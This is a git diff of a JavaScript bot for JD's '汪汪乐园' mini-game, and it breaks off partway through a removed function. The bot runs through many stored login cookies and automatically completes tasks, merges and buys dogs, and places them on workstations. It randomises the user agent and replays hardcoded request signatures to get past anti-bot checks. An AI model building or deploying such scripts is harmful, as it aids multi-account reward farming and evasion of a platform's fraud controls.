@@ -1,418 +1,316 @@
 /*
 #
 京东极速App首页-汪汪乐园
+15 7,11,15,20,22 * * * Sami_jd_wwly.js
  */
-const $ = new Env('Sami汪汪乐园21-40');
-//Node.js用户请在jdCookie.js处填写京东ck;
-const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
-const notify = $.isNode() ? require('./sendNotify') : '';
-const JD_API_HOST = `https://api.m.jd.com`;
-//IOS等用户直接用NobyDa的jd cookie
-let cookiesArr = [],cookie = '';
-
-if ($.isNode()) {
-    Object.keys(jdCookieNode).forEach((item) => {
-        cookiesArr.push(jdCookieNode[item])
-    })
-    if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
-} else {
-    cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
-}
-console.log(`目前有部分账号无法自动做任务了，并提示被风控了，经测试并不是被风控，只是游戏进行了加密，目前解密还有些难度，待解密后就可以恢复，请及时拉脚本，获取最新的脚本 `);
+const $ = new Env("Sami汪汪乐园21-40")
+const Ver = '20220510';
+const JD_API_HOST = 'https://api.m.jd.com/client.action';
+const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
+let cookiesArr = [], cookie = '';
+let shareCodes = [];
 !(async () => {
-    if (!cookiesArr[0]) {
-        $.msg($.name, '【提示】请先获取cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
-        return;
-    }
     await $.wait(1000);
+    await VerCheck("wwly",Ver);
+    await $.wait(1000);
+    requireConfig()
+    await $.wait(5000);
     for (let i = 0; i < cookiesArr.length; i++) {
-        cookie = cookiesArr[i];
-        if (i>=21 && i<=40){
-            try {
-                if (cookie) {
-                $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
-                $.index = i + 1;
-                $.isLogin = true;
-                $.nickName = '';
-                $.dataJson=[];
-                $.vo2=[];
-                $.hc=false;
-                $.hc1=false;
-                $.data =[];
-                if (!$.isLogin) {
-                    $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, { "open-url": "https://bean.m.jd.com/bean/signIndex.action" });
-                    continue
-                }
-                console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
-                ////////////////////首先查询所有汪汪信息，对于的工位上的汪汪，安排下工位///////////////////////////////////////////////////////////
-                for (let ii = 0;ii < 50; ii++){
-                    data = await GetAllInfo();
-                    let aa=  data.data.hasOwnProperty('workJoyInfoList')
-                   if(aa != true){
-                       await $.wait(5000);
-                       data = await GetAllInfo();
-                   }
-                   
-    
-                   
-                   $.vo2= data.data;
-                   for (let vo of  $.vo2.workJoyInfoList) {
-                       if(vo.joyDTO != null){
-                           let joyDTOID= vo.joyDTO.id;
-                           //console.log("qqqq"+joyDTOID); 
-                           let data = await DownPosition(joyDTOID);
-                           if (data.code === 0){
-                               if (data.errMsg === 'success'){
-                                    console.log(`汪汪:`+joyDTOID+`下工位成功!`);
-                                }else{
-                                    console.log(`汪汪:`+joyDTOID+`下工位失败!`);
-                                }
-                           }
-                           
-                       }else if( vo.unlock == true){
-                           console.log(`汪汪:工位上空空如也!`);
-                       }
-                        
-                   }
-                   
-                   await $.wait(5000);
-                   $.hcjg = false;
-                   ///////////////////////////////////////
-                   data = await GetAllInfo();///
-                    aa = data.data.hasOwnProperty('workJoyInfoList');
-                   if(aa != true){
-                       await $.wait(5000);
-                       data = await GetAllInfo();
-                   }
-                   /////////////////////////
-                   await $.wait(5000);
-                   $.vo2= data.data;
-                    for (let vo of  $.vo2.activityJoyList) {
-                        let joyDTOID1= vo.id;
-                        let joyDTOlevel1= vo.level;
-                         for (let vo1 of  $.vo2.activityJoyList) {
-                             let joyDTOID2= vo1.id;
-                             let joyDTOlevel2= vo1.level;
-                             if(joyDTOID1 != joyDTOID2 && joyDTOlevel1 == joyDTOlevel2 ){
-                                let DoMerge1 = await DoMerge(joyDTOID1,joyDTOID2);
-                                if(DoMerge1.code === 0){
-                                    if(DoMerge1.errMsg=="success"){
-                                        console.log(`汪汪:合成成功!`);
-                                        await $.wait(8000);
-                                        $.hcjg = true;
-                                        break;
-                                    }
-                                }
-                                await $.wait(2000);
-                             }
-                         }
-                         if ($.hcjg == true){
-                            break;
-                         }
+        cookie = cookiesArr[i]
+        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
+        $.index = i + 1;
+        $.nickName = '';
+        $.Flag = false;
+        $.UserName1 =encodeURIComponent($.UserName)
+        console.log(`\n账号【${$.index}】${$.UserName} 汪汪乐园2022信息`);
+        if (i>=20 && i<40){
+           
+        }else{
+            console.log('不再执行范围内')
+            continue;
+        }
+        ////////////////////Start:首先查询所有汪汪信息，对于的工位上的汪汪，安排下工位///////////////////////////////////////////////////////////
+        //https://api.m.jd.com/?functionId=joyList&body={%22linkId%22:%22LsQNxL7iWDlXUs6cFl-AAg%22}&t=1652164181116&appid=activities_platform&h5st=20220510142941528%3B6237189232500324%3Be18ed%3Btk02w74971b5418nCO2IGnkJD1EEOaSj2R5iGZbaEzPiBBT3ysEVje9VHW9iP3CgBjoL4LzHdbRszFJW8i7qZ8bcgpH1%3B2d59de7c2f030ee9d8c9e0e735dd3b070e756b0d67b147dbdfa792c79b5dde52%3B3.0%3B1652164181528&cthr=1
+        //获得所有汪汪信息
+        data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
+        //console.log(data)
+        for (let vo of  data.data?.workJoyInfoList) {
+            if(vo.joyDTO != null){
+               let joyDTOID= vo.joyDTO.id;
+               let location =vo.location;
+               //console.log("qqqq"+joyDTOID); 
+               //汪汪下工位
+               data = await GetInfo(`joyMove`,Date.now(),`{"joyId":`+joyDTOID+`,"location":0,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
+               //console.log(data)
+               //{ success: true, code: 0, errMsg: 'success', data: null }
+               if (data.code === 0){
+                   if (data.errMsg === 'success'){
+                        console.log(`汪汪乐园:工位`+location +` `+joyDTOID+`下工位成功!`);
+                    }else{
+                        console.log(`汪汪乐园:工位`+location +` `+joyDTOID+`下工位失败!`);
                     }
-                    if( $.hcjg == false){
-                        break;
-                    }
-                }
-                ////////////////////开始做任务///////////////////////////////////////////////////////////
-                ///////////////////////////////////////
-                data = await GetAllTask();///
-                $.vo2= data;
-                //console.log($.vo2);
-                
-                for (let vo of  $.vo2.data) {
-                    let id=vo.id;
-                    let taskTitle=vo.taskTitle;
-                    let taskDoTimes=vo.taskDoTimes;
-                    console.log('**************************');
-                    console.log('开始任务：'+taskTitle);
-                    
-                    if (id==264 && (taskDoTimes==0 || taskDoTimes===null)){
-                        //console.log(taskTitle);
-                       await eveDayChack("apDoTask",id,"SIGN",taskTitle);
-                       await $.wait(4000);
-                       await eveDayChack("apTaskDrawAward",id,"SIGN",taskTitle);
-                    }else if(id==264){
-                         console.log('-->'+taskTitle + ':任务已完成');
-                    }
-                    
-                    if (id==662 && (taskDoTimes==0 || taskDoTimes===null)){
-                       let data = await apDoTask("apDoTask",id,encodeURIComponent(vo.taskSourceUrl),"BROWSE_CHANNEL",taskTitle);
-                       //console.log(data)
-                       await $.wait(4000);
-                       await eveDayChack("apTaskDrawAward",id,"BROWSE_CHANNEL",taskTitle);
-                    }else if(id==662){
-                         console.log('-->'+taskTitle + ':任务已完成');
-                    }
-                    
-                    if (id==481 && (taskDoTimes != 5 || taskDoTimes===null)){
-                      //console.log(taskTitle);
-                      data = await gsh("apTaskDetail",id,"BROWSE_CHANNEL");
-                      //console.log($.dataJson);
-                      if (data.success===true){
-                          //taskItemList
-                            for (let vo3 of  data.data.taskItemList) {
-                                let itemId=vo3.itemId;
-                                let itemName=vo3.itemName;
-                                console.log('--------------------------------');
-                                console.log(itemName);
-                                await apDoTask("apDoTask",id,itemId,"BROWSE_CHANNEL",taskTitle);
-                                await $.wait(5000);
-                                await eveDayChack("apTaskDrawAward",id,"BROWSE_CHANNEL",taskTitle);
-                                await $.wait(5000);
-                                
-                            }
-                      }
-                    }else if(id==481){
-                         console.log('-->'+taskTitle + ':任务已完成');
-                    }
-                    
-                    if (id==630 && (taskDoTimes != 5 || taskDoTimes===null)){
-                      // console.log(taskTitle);
-                      data = await gsh("apTaskDetail",id,"BROWSE_PRODUCT");
-                      //console.log($.dataJson);
-                      $.vo3=data;
-                      if ($.vo3.success===true){
-                          //taskItemList
-                          $.jc=taskDoTimes;
-                                if(taskDoTimes === null){
-                                    $.jc = 0;
-                                }
-                            for (let vo3 of  $.vo3.data.taskItemList) {
-                                let itemId=vo3.itemId;
-                                let itemName=vo3.itemName;
-                                console.log('--------------------------------');
-                                console.log(itemName);
-                                
-                                await apDoTask("apDoTask",id,itemId,"BROWSE_PRODUCT",taskTitle);
-                                if (data.success===false){
-                                    console.log(`跳入下一个资源`)
-                                    if(data.code===2005){
-                                      break;
-                                    }
-                                }else{
-                                    await $.wait(5000);
-                                    await eveDayChack("apTaskDrawAward",id,"BROWSE_PRODUCT",taskTitle);
-                                    await $.wait(5000);
-                                    $.jc=$.jc+1;
-                                }
-                                if($.jc >= 5){
-                                        break;
-                                    }
-                                    if(data.success===false){
-                                        break;
-                                    }
-                                
-                            }
-                      }
-                    }else if(id==630){
-                         console.log('-->'+taskTitle + ':任务已完成');
-                    }
-                    
-                   
-                  }
-                  await $.wait(1000);
-                ////////////////////开始购买并合成///////////////////////////////////////////////////////////
-                 $.hcjg = false;
-                for (let ii = 0;ii < 50; ii++){
-                    if ( $.hcjg === false){
-                        data = await joyBaseInfo();
-                        if(data.code===0){
-                            if(data.data.level===30){
-                                console.log('汪汪已经成熟啦，赶紧领取！！！');
+               }
+               
+           }else if( vo.unlock == true){
+               let location =vo.location;
+               console.log(`汪汪乐园:工位`+location+`上空空如也!`);
+           }
+        }
+        ////////////////////End:首先查询所有汪汪信息，对于的工位上的汪汪，安排下工位///////////////////////////////////////////////////////////
+        ////////////////////Start:对已经存在的汪汪进行合成///////////////////////////////////////////////////////////
+        $.hcjg = false;
+        for (let i = 0;i < 50; i++){
+            $.hcjg = false;
+            //获得所有汪汪信息
+            data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
+            for (let vo of  data.data?.activityJoyList){
+                let joyDTOID1= vo.id;
+                let joyDTOlevel1= vo.level;
+                //console.log(vo.id + vo.level);
+                for (let vo1 of  data.data?.activityJoyList){
+                    let joyDTOID2= vo1.id;
+                    let joyDTOlevel2= vo1.level;
+                    //判断是否有相同等级的汪汪
+                    if(joyDTOID1 != joyDTOID2 && joyDTOlevel1 == joyDTOlevel2 ){
+                        //开始合成
+                        MergeGet = await GetInfo(`joyMergeGet`,Date.now(),`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8420176953300815`,`b08cf`,`0`,$.UserName1);
+                        if(MergeGet.code === 0){
+                            if(MergeGet.errMsg=="success"){
+                                console.log(`汪汪:合成成功!`);
+                                await $.wait(8000);
+                                $.hcjg = true;
                                 break;
-                            }else{
-                                console.log('---------------------------------');
-                                console.log('汪汪目前等级:'+data.data.level);
-                                console.log('汪汪购买等级:'+data.data.fastBuyLevel);
-                                if (data.data.joyCoin >= data.data.fastBuyCoin){
-                                    data1 = await joyBuy(data.data.fastBuyLevel);
-                                    if (data1.code ===0){
-                                        console.log('汪汪购买成功:'+data1.data.name);
-                                    }else{
-                                        console.log('汪汪购买失败,5S后重试');
-                                        await $.wait(5000)
-                                        data1 = await joyBuy(data.data.fastBuyLevel);
-                                        if (data1.code ===0){
-                                        console.log('汪汪购买成功:'+data1.data.name);
-                                    }else{
-                                        console.log('汪汪购买失败，程序退出购买');
-                                        break;
-                                    }
-                                        
-                                    }
-                                }else{
-                                    console.log('汪汪购买失败:没有钱了！！');
-                                    break;
-                                }
-                                
-                                
                             }
                         }
-                    }
-                    
-                    //购买成功后开始合成
-                   await $.wait(5000);
-                  $.hcjg = false;
-                   ///////////////////////////////////////
-                   //data = await GetAllInfo();///
-                   data = await GetAllInfo();///
-                   aa=  data.data.hasOwnProperty('workJoyInfoList')
-                   if(aa != true){
-                       await $.wait(5000);
-                       data = await GetAllInfo();
-                   }
-                   /////////////////////////
-                   
-                   await $.wait(5000);
-                   $.vo2= data.data;
-                    for (let vo of  $.vo2.activityJoyList) {
-                        let joyDTOID1= vo.id;
-                        let joyDTOlevel1= vo.level;
-                         for (let vo1 of  $.vo2.activityJoyList) {
-                             let joyDTOID2= vo1.id;
-                             let joyDTOlevel2= vo1.level;
-                             if(joyDTOID1 != joyDTOID2 && joyDTOlevel1 == joyDTOlevel2 ){
-                                let DoMerge1 = await DoMerge(joyDTOID1,joyDTOID2);
-                                if(DoMerge1.code === 0){
-                                    if(DoMerge1.errMsg=="success"){
-                                        console.log(`汪汪:合成成功!`);
-                                        await $.wait(8000);
-                                        $.hcjg = true;
-                                        break;
-                                    }
-                                }
-                                await $.wait(2000);
-                             }
-                         }
-                         if ($.hcjg == true){
-                            break;
-                         }
+                        await $.wait(2000);
                     }
                 }
-                    
-                ////////////////////开始上工位打工///////////////////////////////////////////////////////////
-                 ///////////////////////////////////////
-                   data = await GetAllInfo();///
-                   aa=  data.data.hasOwnProperty('workJoyInfoList')
-                   if(aa != true){
-                       await $.wait(5000);
-                       data = await GetAllInfo();
-                   }
-                   /////////////////////////
-                   await $.wait(5000);
-                   
-                   data.data.activityJoyList=sortByKey( data.data.activityJoyList,"level");
-                   $.vo2= data.data;
-                   //let string = JSON.stringify(data.data)
-                   //console.log(`汪汪:上工位成功!`+string);
-                   //{ location: 1, unlock: true, joyDTO: null }
-                   for (let vo of  $.vo2.workJoyInfoList) {
-                       
-                       if (vo.unlock === true && vo.joyDTO === null){
-                           for (let vo1 of  $.vo2.activityJoyList) {
-                                 let joyDTOID= vo1.id;
-                                 data = await joyMove(joyDTOID,vo.location);
-                                 console.log(data);
-                                 if(data.code === 0){
-                                     console.log(`汪汪:`+vo1.level+`上工位成功!`);
-                                      //data = await GetAllInfo();
-                                      ///////////////////////////////////////
-                                       data = await GetAllInfo();///
-                                       aa=  data.data.hasOwnProperty('workJoyInfoList')
-                                       if(aa != true){
-                                           await $.wait(5000);
-                                           data = await GetAllInfo();
-                                       }
-                                       /////////////////////////
-                                       await $.wait(5000);
-                                        data.data.activityJoyList=sortByKey( data.data.activityJoyList,"level");
-                                       $.vo2= data.data;
-                                 }
-                                 break;
-                            }
-                       }
-                   }
-                       
-                           
-                           
-                           
-                    
-                
-                
-                
-                console.log(`时间等待10S`);
-                await $.wait(10000);
-                // await GetAllInfo();
-                // $.vo2=$.dataJson.data;
-                // console.log($.vo2);
-                // for (let vo of  $.vo2.workJoyInfoList) {
-                //     if(vo.joyDTO != null){
-                //       let joyDTOID= vo.joyDTO.id;
-                //       let location = vo.location;
-                //       console.log("qqqq"+joyDTOID); 
-                //       await DownPosition(joyDTOID,"0");
-                //       await $.wait(2000);
-                //     }
-                //   }
-                ////////////////////首先查询所有汪汪信息，对于的工位上的汪汪，安排下工位///////////////////////////////////////////////////////////
-                //await $.wait(1000);
-                ////////////////////下工位后开始进行合成///////////////////////////////////////////////////////////
-                // for (let ii = 0; ii < 50; ii++) {
-                //     $.hc=false;
-                //     console.log(`3`);
-                //     await GetAllInfo();
-                //     $.vo2=$.dataJson.data;
-                //     for (let vo of  $.vo2.activityJoyList) {/////////////////////////////////////////////////
-                //         let id= vo.id;
-                //         let level = vo.level;
-                //         for (let vo1 of  $.vo2.activityJoyList) {//******************************************
-                //           let id1= vo1.id;
-                //           let level1 = vo1.level;
-                //           if (id1 != id && level1===level){
-                //               console.log("qqqq"+id1 + "-"+id+"--qqqq"+level1+"-"+level); 
-                //               //开始合成，合成成功跳出for循环 进行下一次合成
-                //               await DoMerge(id1,id);
-                //               console.log(`2`);
-                //               //$.hc=true;
-                //               break;
-                //           }
-                //           await $.wait(2000);
-                //         }//******************************************
-                //         if($.hc===true){
-                //             break;
-                //         }
-                        
-                        
-                //     }////////////////////////////////////////////////////////////////
-                //     if ($.hc===false){
-                //         break;
-                //     }
-                //     if ($.hc1===true){
-                //         console.log(`合成网络失败`);
-                //         break;
-                //     }
-                //     console.log(`1`);
-                    
-                // }
-                
-                
-                
-                if (i != cookiesArr.length - 1) {
-                    await $.wait(2000);
+                if ($.hcjg == true){
+                    break;
                 }
-            }
-            } catch (e) {
-                
-            } finally {
                 
             }
+            if( $.hcjg == false){
+               console.log("汪汪乐园:初始化无合成的汪汪!!!")
+               break;
+            }
+            
+            
         }
+        
+        ////////////////////End:对已经存在的汪汪进行合成///////////////////////////////////////////////////////////
+        ////////////////////Start:开始做汪汪任务///////////////////////////////////////////////////////////
+        data = await GetAllTask();
+        for (let vo of  data.data) {
+            let id=vo.id;
+            let taskTitle=vo.taskTitle;
+            let taskDoTimes=vo.taskDoTimes;
+            console.log('**************************');
+            console.log('开始任务：'+taskTitle);
+            //***************************************************************
+            if (id==264 && (taskDoTimes==0 || taskDoTimes===null)){
+                //console.log(taskTitle);
+                await eveDayChack("apDoTask",id,"SIGN",taskTitle);
+                await $.wait(4000);
+                await eveDayChack("apTaskDrawAward",id,"SIGN",taskTitle);
+            }else if(id==264){
+                console.log('-->'+taskTitle + ':任务已完成');
+            }
+            //***************************************************************        
+            if (id==662 && (taskDoTimes==0 || taskDoTimes===null)){
+                let data = await apDoTask("apDoTask",id,encodeURIComponent(vo.taskSourceUrl),"BROWSE_CHANNEL",taskTitle);
+                //console.log(data)
+                await $.wait(4000);
+                await eveDayChack("apTaskDrawAward",id,"BROWSE_CHANNEL",taskTitle);
+            }else if(id==662){
+                console.log('-->'+taskTitle + ':任务已完成');
+            }
+            //***************************************************************         
+            if (id==481 && (taskDoTimes != 5 || taskDoTimes===null)){
+              //console.log(taskTitle);
+              data = await gsh("apTaskDetail",id,"BROWSE_CHANNEL");
+              //console.log($.dataJson);
+              if (data.success===true){
+                  //taskItemList
+                    for (let vo3 of  data.data.taskItemList) {
+                        let itemId=vo3.itemId;
+                        let itemName=vo3.itemName;
+                        console.log('--------------------------------');
+                        console.log(itemName);
+                        await apDoTask("apDoTask",id,itemId,"BROWSE_CHANNEL",taskTitle);
+                        await $.wait(5000);
+                        await eveDayChack("apTaskDrawAward",id,"BROWSE_CHANNEL",taskTitle);
+                        await $.wait(5000);
+                        
+                    }
+              }
+            }else if(id==481){
+                 console.log('-->'+taskTitle + ':任务已完成');
+            }
+            //***************************************************************         
+            if (id==630 && (taskDoTimes != 5 || taskDoTimes===null)){
+              // console.log(taskTitle);
+              data = await gsh("apTaskDetail",id,"BROWSE_PRODUCT");
+              //console.log($.dataJson);
+              $.vo3=data;
+              if ($.vo3.success===true){
+                  //taskItemList
+                  $.jc=taskDoTimes;
+                    if(taskDoTimes === null){
+                       $.jc = 0;
+                    }
+                    for (let vo3 of  $.vo3.data.taskItemList) {
+                        let itemId=vo3.itemId;
+                        let itemName=vo3.itemName;
+                        console.log('--------------------------------');
+                        console.log(itemName);
+                        
+                        await apDoTask("apDoTask",id,itemId,"BROWSE_PRODUCT",taskTitle);
+                        if (data.success===false){
+                            console.log(`跳入下一个资源`)
+                            if(data.code===2005){
+                              break;
+                            }
+                        }else{
+                            await $.wait(5000);
+                            await eveDayChack("apTaskDrawAward",id,"BROWSE_PRODUCT",taskTitle);
+                            await $.wait(5000);
+                            $.jc=$.jc+1;
+                        }
+                        if($.jc >= 5){
+                                break;
+                            }
+                            if(data.success===false){
+                                break;
+                            }
+                        
+                    }
+              }
+            }else if(id==630){
+                 console.log('-->'+taskTitle + ':任务已完成');
+            }
+                    
+                   
+        }
+        await $.wait(1000); 
+        
+        ////////////////////End:开始做汪汪任务///////////////////////////////////////////////////////////
+        ////////////////////Start:开始购买汪汪并合成///////////////////////////////////////////////////////////
+        $.hcjg = false;
+        for (let i = 0;i < 50; i++){
+            $.hcjg = false;
+            //购买汪汪
+            data = await GetInfo(`joyBaseInfo`,Date.now(),`{"taskId":"","inviteType":"","inviterPin":"","linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`7149631238350732`,`4abce`,`1`,$.UserName1);
+            if(data.code===0){
+                if(data.data.level===30){
+                    console.log('汪汪已经成熟啦，赶紧领取！！！');
+                    break;
+                }else{
+                    //***************************************************************开始购买
+                    console.log('---------------------------------');
+                    console.log('汪汪目前等级:'+data.data.level);
+                    console.log('汪汪购买等级:'+data.data.fastBuyLevel);
+                    if (data.data.joyCoin >= data.data.fastBuyCoin){
+                        console.log('钱购买');
+                        data1 = await GetInfo(`joyBuy`,Date.now(),`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6020245910128165`,`ffb36`,`1`,$.UserName1);
+                        if (data1.code ===0){
+                            console.log('汪汪购买成功:'+data1.data.name);
+                        }else{
+                            console.log('汪汪购买失败,5S后重试');
+                            await $.wait(5000)
+                            data1 = await GetInfo(`joyBuy`,Date.now(),`{"level":`+data.data.fastBuyLevel+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6020245910128165`,`ffb36`,`1`,$.UserName1);
+                            if (data1.code ===0){
+                                console.log('汪汪购买成功:'+data1.data.name);
+                            }else{
+                                console.log('汪汪购买失败，程序退出购买');
+                                break;
+                            }
+                            
+                        }
+                    }else{
+                        console.log('汪汪购买失败:没有钱了！！');
+                        break;
+                    }
+                    console.log("购买完成")
+                //***************************************************************购买后合成    
+                    $.hcjg = false;
+                    for (let ii = 0;ii < 50; ii++){
+                        $.hcjg = false;
+                        //获得所有汪汪信息
+                        data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
+                        for (let vo of  data.data?.activityJoyList){
+                            let joyDTOID1= vo.id;
+                            let joyDTOlevel1= vo.level;
+                            //console.log(vo.id + vo.level);
+                            for (let vo1 of  data.data?.activityJoyList){
+                                let joyDTOID2= vo1.id;
+                                let joyDTOlevel2= vo1.level;
+                                //判断是否有相同等级的汪汪
+                                if(joyDTOID1 != joyDTOID2 && joyDTOlevel1 == joyDTOlevel2 ){
+                                    //开始合成
+                                    MergeGet = await GetInfo(`joyMergeGet`,Date.now(),`{"joyOneId":`+joyDTOID1+`,"joyTwoId":`+joyDTOID2+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8420176953300815`,`b08cf`,`0`,$.UserName1);
+                                    if(MergeGet.code === 0){
+                                        if(MergeGet.errMsg=="success"){
+                                            console.log(`汪汪:合成成功!`);
+                                            await $.wait(8000);
+                                            $.hcjg = true;
+                                            break;
+                                        }
+                                    }
+                                    await $.wait(2000);
+                                }
+                            }
+                            if ($.hcjg == true){
+                                break;
+                            }
+                            
+                        }
+                        if( $.hcjg == false){
+                           console.log("汪汪乐园:无合成的汪汪!!!")
+                           break;
+                        }
+                    }
+                //***************************************************************
+                    
+                }
+            }
+            
+            
+        }
+            
+        ////////////////////End:开始购买汪汪///////////////////////////////////////////////////////////
+        ////////////////////Start:开始上工位///////////////////////////////////////////////////////////
+        data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
+        data.data.activityJoyList=sortByKey(data.data?.activityJoyList,"level");
+        for (let vo of  data.data?.workJoyInfoList) {
+           if (vo.unlock === true && vo.joyDTO === null){
+               for (let vo1 of  data.data?.activityJoyList) {
+                    let joyDTOID= vo1.id;
+                     //data = await joyMove(joyDTOID,vo.location);
+                    data = await GetInfo(`joyMove`,Date.now(),`{"joyId":`+joyDTOID+`,"location":`+vo.location+`,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`8914487521916936`,`50788`,`1`,$.UserName1);
+                    //console.log(data);
+                    if(data.code === 0){
+                        console.log(`汪汪:`+vo1.level+`上工位成功!`);
+                        data = await GetInfo(`joyList`,Date.now(),`{"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}`,`6237189232500324`,`e18ed`,`0`,$.UserName1);
+                        await $.wait(5000);
+                        data.data.activityJoyList=sortByKey( data.data.activityJoyList,"level");
+                    }
+                    break;
+                }
+           }
+        }
+        ////////////////////End:开始上工位///////////////////////////////////////////////////////////
+        
+        console.log("OK")
+        await $.wait(50000);
     }
-})()
-    .catch((e) => $.logErr(e))
-    .finally(() => $.done())
-
+    
+})()  .catch((e) => {
+    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
+  })
+  .finally(() => {
+    $.done();
+  })
 
 function sortJson(a,b){  
    return b.level-a.level;  
@@ -425,119 +323,6 @@ function sortByKey(array, key) {
      });
  }
 
-
-
-//获取所有工位信息
-function GetAllInfo() {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/?functionId=joyList&body={%22linkId%22:%22LsQNxL7iWDlXUs6cFl-AAg%22}&_t=1644237008865&appid=activities_platform`,
-            headers: {
-                "referer": "https://joypark.jd.com/",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": cookie,
-                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
-            }
-        }
-        $.get(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-                    } else {
-                        console.log(`京东服务器返回空数据`)
-                    }
-                }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
-    })
-}
-
-//下工位
-function DownPosition(joyId) {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/`,
-            body: `functionId=joyMove&body={"joyId":${joyId},"location":0,"linkId":"LsQNxL7iWDlXUs6cFl-AAg"}&_t=1644557796198&appid=activities_platform`,
-            headers: {
-                "referer": "https://joypark.jd.com/",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": cookie,
-                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
-            }
-        }
-        $.post(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-                        //$.dataJson=data;
-                        //{"success":true,"code":0,"errMsg":"success","data":{"activityJoyList":[{"id":88670,"level":29,"name":"暖心汪","speed":"268435456","recoveryPrice":1970013226251930,"fastBuyLevel":null,"fastBuyCoin":null},{"id":89068,"level":28,"name":"画家汪","speed":"134217728","recoveryPrice":721616566392651,"fastBuyLevel":null,"fastBuyCoin":null},{"id":89070,"level":26,"name":"滑板汪","speed":"33554432","recoveryPrice":96823594358256,"fastBuyLevel":null,"fastBuyCoin":null}],"workJoyInfoList":[{"location":1,"unlock":true,"joyDTO":null},{"location":2,"unlock":true,"joyDTO":null},{"location":3,"unlock":false,"joyDTO":null},{"location":4,"unlock":false,"joyDTO":null},{"location":5,"unlock":false,"joyDTO":null}],"joyNumber":3}}
-                    } else {
-                        console.log(`京东服务器返回空数据`)
-                    }
-                }
-            } catch (e) {
-                $.logErr(e, resp)
-            } finally {
-                resolve(data);
-            }
-        })
-    })
-}
-
-//开始合成
-function DoMerge(joyId1,joyId2) {
-    return new Promise(async resolve => {
-        const options = {
-            url: `https://api.m.jd.com/?functionId=joyMergeGet&body={%22joyOneId%22:${joyId1},%22joyTwoId%22:${joyId2},%22linkId%22:%22LsQNxL7iWDlXUs6cFl-AAg%22}&_t=1644237007838&appid=activities_platform`,
-            headers: {
-                "referer": "https://joypark.jd.com/",
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Cookie": cookie,
-                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
-            }
-        }
-        $.get(options, (err, resp, data) => {
-            try {
-                if (err) {
-                    console.log(`${JSON.stringify(err)}`)
-                    console.log(`${$.name} API请求失败，请检查网路重试`)
-                    $.hc1=true;
-                } else {
-                    if (data) {
-                        data = JSON.parse(data);
-
